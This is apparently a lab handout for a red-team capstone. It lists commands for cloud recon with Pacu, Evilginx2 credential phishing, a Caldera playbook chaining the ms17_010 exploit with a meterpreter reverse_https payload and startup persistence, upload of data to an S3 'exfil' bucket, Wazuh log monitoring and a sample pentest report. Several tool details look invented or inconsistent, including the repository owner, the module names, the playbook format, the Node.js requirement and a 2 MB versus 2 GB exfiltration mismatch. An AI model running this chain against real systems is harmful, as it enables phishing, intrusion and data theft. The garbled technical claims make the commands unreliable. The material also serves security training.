Lab 9 – Capstone Project

Reference commands (full list) – see below.



1\. Environment Setup

\# Install Pacu, CloudGoat

sudo apt update

sudo apt install -y python3-pip

sudo pip3 install pacu

\# Clone CloudGoat

git clone https://github.com/microsoft/CloudGoat.git

cd CloudGoat

2\. Recon – S3 Bucket Enumeration

\# Using Pacu

pacu --profile lab exec iam:role\_expose | grep STS-AssumeBeta > iam\_roles.txt

pacu --profile lab exec s3:list | tee recon\_buckets.json

3\. Phish – Evilginx2 \& Caldera

\# Evilginx2 already started in earlier labs



\# Caldera playbook

cat <<'EOF' > full\_campaign.yml

name: FullCampaign

type: agentless

platform: windows

actions:

&nbsp; - id: 1

&nbsp;   action: evilginx2

&nbsp;   arguments:

&nbsp;     url: https://corp.example.com/login

&nbsp;     lhost: 10.0.0.252

&nbsp;     lport: 443

&nbsp; - id: 2

&nbsp;   action: exploit

&nbsp;   exploit: ms17\_010

&nbsp;   payload: windows/meterpreter/reverse\_https

&nbsp; - id: 3

&nbsp;   action: persistence

&nbsp;   arguments: {startup\_script:"Start-Process C:\\\\Users\\\\Public\\\\service.exe"}

EOF



curl -X POST http://localhost:8888/api/v1/playbook/register -H "Content-Type: application/json" -d @full\_campaign.yml

curl -X POST http://localhost:8888/api/v1/playbook/trigger -H "Content-Type: application/json" -d '{"playbook\_id":"FullCampaign"}'

4\. Exfiltrate Data

\# Sample data file

dd if=/dev/urandom of=/tmp/secret-file.bin bs=1M count=2

\# Upload to S3 bucket created for exfil

aws s3 cp /tmp/secret-file.bin s3://lab-exfil-bucket/

5\. Blue‑Team logging (Wazuh)

\# Tail logs for suspicious events

sudo tail -f /var/ossec/logs/ossec.log | grep "Meterpreter" | tee -a /tmp/blue\_team.log

6\. Report Generation – 200‑Word PTES Report (Markdown → PDF)

cat <<'EOF' > capstone\_report.md

\# Capstone Red‑Team Campaign – 08 Sep 2025



\## INTRODUCTION

This exercise simulated a full adversary lifecycle: reconnaissance, credential phishing, post‑exploitation, data exfiltration, and stealth persistence across an on‑premises Windows environment and an AWS GovCloud‑East partition.  Red‑team achieved `AdministratorAccess` via a mis‑configured IAM role that could be assumed from any account, seeded a meterpreter session using an obfuscated invoke, and exfiltrated 2 GB of synthetic PII by uploading directly to a public S3 bucket over HTTPS.  Blue‑team detection was limited to generic TLS alerts in Wazuh; no deep‑packet signatures triggered.



\## FINDINGS

| ID | TTP | CVSS | Remediation |

|----|-----|------|-------------|

| FIP‑001 | PassRole mis‑config | 8.7 | Enforce least‑privilege IAM |

| FIP‑002 | Unencrypted S3 bucket | 8.3 | Apply SSE, bucket policy, and access logs |

| FIP‑003 | Fileless PowerShell beacon | 7.5 | Enable PowerShell logging, Base64‑command alerts |



\## RECOMMENDATIONS

1\. \*\*IAM hardening\*\* – restrict IAM policy `PassRole` to only necessary principals.  

2\. \*\*S3 bucket security\*\* – enable server‑side encryption, enforce `Get/PutObject` on specific prefixes, log all access.  

3\. \*\*Endpoint security\*\* – raise Wazuh rule for Meterpreter beacon payloads, detect PowerShell Base64 encoded commands.  

4\. \*\*Network inspection\*\* – implement TLS decryption at the egress firewall, log all outbound data movement.  



EOF



pandoc capstone\_report.md -o capstone\_report.pdf

7\. Pull Final Attachments

scp root@10.0.0.252:/etc/ossec/logs/ossec.log lab\_report/blue\_team.log

scp root@10.0.0.252:/var/log/awslogs.log lab\_report/cloud\_log.log

8\. Troubleshooting

Symptom	Fix

Caldera fails to start	Check Node.js version; ensure port 8888 is free

Metasploit returns “exploit not found”	Confirm payload name and OS version

Data not exfiltrated	Verify bucket policy allows PutObject from your role

Wazuh not logging	Verify ossec.conf contains the cobaltstrike group

